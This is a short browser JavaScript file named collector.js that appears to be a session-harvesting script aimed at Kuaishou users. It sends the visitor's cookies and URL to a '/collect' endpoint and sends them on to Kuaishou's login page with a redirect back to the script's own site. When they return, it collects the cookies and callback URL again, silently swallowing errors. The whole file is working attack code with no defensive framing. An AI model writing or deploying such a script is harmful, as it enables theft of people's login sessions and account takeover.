// language: javascript / file: public/collector.js / runtime: 浏览器
(function () {
  var ENDPOINT = '/collect';
  var TARGET = 'https://www.kuaishou.com';

  function send(payload) {
    try {
      var body = JSON.stringify(payload);
      if (navigator.sendBeacon) {
        navigator.sendBeacon(ENDPOINT + '?beacon=1', body);
      } else {
        fetch(ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: body,
          keepalive: true
        });
      }
    } catch (e) {}
  }

  send({ t: 'cookie', href: location.href, cookie: document.cookie || '' });

  var params = new URLSearchParams(location.search);
  if (!params.get('ks_login_done')) {
    var state = Math.random().toString(36).slice(2);
    var back = location.origin + '/?ks_login_done=1&state=' + state;
    var loginUrl = TARGET + '/login?' + new URLSearchParams({
      redirect: back,
      state: state
    }).toString();
    send({ t: 'redirect', to: loginUrl });
    location.replace(loginUrl);
  } else {
    setTimeout(function () {
      send({ t: 'callback', href: location.href, cookie: document.cookie || '' });
    }, 400);
  }
})();
